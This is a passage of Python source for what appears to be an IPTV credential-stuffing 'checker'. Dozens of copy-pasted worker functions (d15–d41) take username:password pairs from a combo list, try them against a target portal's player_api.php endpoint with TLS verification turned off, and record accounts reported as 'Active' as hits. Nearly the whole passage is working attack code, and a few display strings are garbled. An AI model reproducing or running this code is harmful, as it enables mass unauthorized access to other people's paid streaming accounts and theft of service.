                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)
            
             
def d15():
    global hit
    say=0
    for fyz in range(15,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_15'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)
             
                                                                                                    
def d16():
    global hit
    say=0
    for fyz in range(16,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_16'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)
             
def d17():
    global hit
    say=0
    for fyz in range(17,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_17'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d18():
    global hit
    say=0
    for fyz in range(18,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_18'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d19():
    global hit
    say=0
    for fyz in range(19,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_19'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 ??                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d20():
    global hit
    say=0
    for fyz in range(20,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_20'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d21():
    global hit
    say=0
    for fyz in range(21,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_21'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d22():
    global hit
    say=0
    for fyz in range(22,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_22'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d23():
    global hit
    say=0
    for fyz in range(23,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_23'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d24():
    global hit
    say=0
    for fyz in range(24,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_24'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d25():
    global hit
    say=0
    for fyz in range(25,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_25'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d26():
    global hit
    say=0
    for fyz in range(26,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_26'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d27():
    global hit
    say=0
    for fyz in range(27,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_27'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d28():
    global hit
    say=0
    for fyz in range(28,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_28'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d29():
    global hit
    say=0
    for fyz in range(29,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_29'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d30():
    global hit
    say=0
    for fyz in range(30,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_30'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     ?? 💢 🇭 ?? ???? 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d31():
    global hit
    say=0
    for fyz in range(31,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_31'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d32():
    global hit
    say=0
    for fyz in range(32,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_32'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d33():
    global hit
    say=0
    for fyz in range(33,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_33'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d34():
    global hit
    say=0
    for fyz in range(34,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_34'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d35():
    global hit
    say=0
    for fyz in range(35,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_35'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d36():
    global hit
    say=0
    for fyz in range(36,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_36'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d37():
    global hit
    say=0
    for fyz in range(37,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_37'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)
                     
def d38():
    global hit
    say=0
    for fyz in range(38,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_38'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d39():
    global hit
    say=0
    for fyz in range(39,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_39'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)                     

def d40():
    global hit
    say=0
    for fyz in range(40,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_40'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d41():
    global hit
    say=0
    for fyz in range(41,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_41'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
